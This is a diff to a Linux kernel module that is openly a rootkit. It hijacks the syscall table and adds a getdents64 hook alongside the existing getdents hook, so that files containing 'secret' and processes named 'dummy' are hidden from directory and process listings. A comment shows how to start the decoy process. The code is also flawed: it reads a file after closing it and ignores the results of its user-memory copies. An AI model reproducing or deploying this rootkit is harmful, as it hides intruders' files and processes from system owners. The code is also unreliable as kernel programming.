@@ -35,7 +35,7 @@ MODULE_DESCRIPTION("TOTALLY NOT A ROOTKIT");
 static unsigned long *sys_call_table;	//points to kernel's syscall table
 
 //max numTargets
-#define numTargets 5
+#define numTargets 6
 //MAKE CHANGES TO THE BELOW ARRAYS IN THE loadMod() function
 static int syscall_names[numTargets]; //array defining syscall name (macro index) for each target
 static void* original_syscallPtrs[numTargets]; //array to store ptrs to the original kernel syscall functions
@@ -104,16 +104,17 @@ char * get_cmdline_path(char * buf, char * pid) {
 	return buf;
 }
 
-#define HIDE_FILE "secret"
+#define HIDE_FILE "secret"	//You can also hide processes by PID using HIDE_FILE
 #define HIDE_PROCESS "dummy"
-// You can create a dummy process with this command: perl  -MPOSIX -e '$0="dummy"; pause' &
+// You can create a dummy process that runs and does nothing with this command: 
+// perl  -MPOSIX -e '$0="dummy"; pause' &
 
 asmlinkage long totallyReal_getdents(unsigned int fd, struct linux_dirent * dirp, unsigned int count) {
-	pr_info("FAKEGETDENTS: Intercepted getdents of fd=%d %p %d\n", fd, dirp, count);
-	// output is the number of bytes read
+	// the output of getdents is the number of bytes read
 	int nread;
-	nread = ( ( typeof(sys_getdents)* )(original_syscallPtrs[3]) )(fd, dirp, count);
 	struct linux_dirent *mod_dirp;
+
+	nread = ( ( typeof(sys_getdents)* )(original_syscallPtrs[3]) )(fd, dirp, count);
 	if (nread == -1) {
 		pr_info("FAKEGETDENTS: error calling original function \n");
 		return -1;
@@ -175,6 +176,77 @@ asmlinkage long totallyReal_getdents(unsigned int fd, struct linux_dirent * dirp
 	kvfree(mod_dirp);
 	return nread;
 }
+
+// Equivalent to getdents bot for getdents64
+asmlinkage long totallyReal_getdents64(int fd, struct linux_dirent64 * dirp, unsigned int count) {
+	// the out of getdents is the number of bytes read
+	int nread;
+	struct linux_dirent64 *mod_dirp;
+
+	nread = ( ( typeof(sys_getdents64)* )(original_syscallPtrs[5]) )(fd, dirp, count);
+	if (nread == -1) {
+		pr_info("FAKEGETDENTS: error calling original function \n");
+		return -1;
+	}
+	else {
+		pr_info("FAKEGETDENTS: successfully read getdents");
+	}
+
+	mod_dirp = kvmalloc(nread, GFP_KERNEL);
+	if (mod_dirp == NULL) {
+		pr_info("FAKEGETDENTS: Error");
+		kvfree( mod_dirp );
+		return -1;
+	}
+	
+	copy_from_user( mod_dirp, dirp, nread);
+	
+	int offset = 0;
+	struct linux_dirent64 *p_dirp, *prev;
+	while( offset < nread) {
+		p_dirp = (void *) mod_dirp + offset;
+		unsigned short p_dirent_len = p_dirp->d_reclen;
+		
+		struct file *f;
+		char buf[BUF_SIZE];
+		int i = 0;
+		for (i = 0; i < 128; i++)
+			buf[i] = 0;
+		char filename[128];
+		get_cmdline_path( filename, p_dirp->d_name);
+		pr_info("FAKEGETDENTS: filename is: %s", filename);
+		f = file_open( filename, O_RDONLY, 0 );
+		if (f != NULL) {
+			pr_info("FAKEGETDENTS: File open success");
+			filp_close(f, NULL);
+			file_read(f, 0, buf, BUF_SIZE - 1);
+			pr_info("FAKEGETDENTS: cmdline is %s", buf);
+		}
+		int is_proc_name_match = 0;
+		if ( strncmp( buf, HIDE_PROCESS, 127 ) == 0 )
+			is_proc_name_match = 1;
+
+		if (strstr(p_dirp->d_name, HIDE_FILE) != NULL || is_proc_name_match ) {
+			if (p_dirp == mod_dirp) {
+				pr_info("FAKEGETDENTS: hiding %s", p_dirp->d_name);
+				nread -= p_dirent_len;
+				memmove(mod_dirp, (void *)mod_dirp + p_dirent_len, nread);
+				continue;
+			}
+			prev->d_reclen += p_dirent_len;
+		}
+		else {
+			pr_info("FAKEGETDENTS: normal file '%s'\n", p_dirp->d_name);
+			prev = p_dirp;
+		}
+		offset += p_dirent_len;
+	}
+	copy_to_user(dirp, mod_dirp, nread);
+	kvfree(mod_dirp);
+	return nread;
+}
+
+
 
 
 void injectSyscalls(void){
@@ -245,6 +317,12 @@ int __init loadMod(void){
 	syscall_names[3] = __NR_getdents;
 	totallyReal_syscallPtrs[3] = (void *) &totallyReal_getdents;
 	toInject[3] = 1;
+
+	toInject[4] = 0;	// reserved for sys_kill
+
+	syscall_names[5] = __NR_getdents64;
+	totallyReal_syscallPtrs[5] = (void *) &totallyReal_getdents64;
+	toInject[5] = 1;
 
 	injectSyscalls();
 
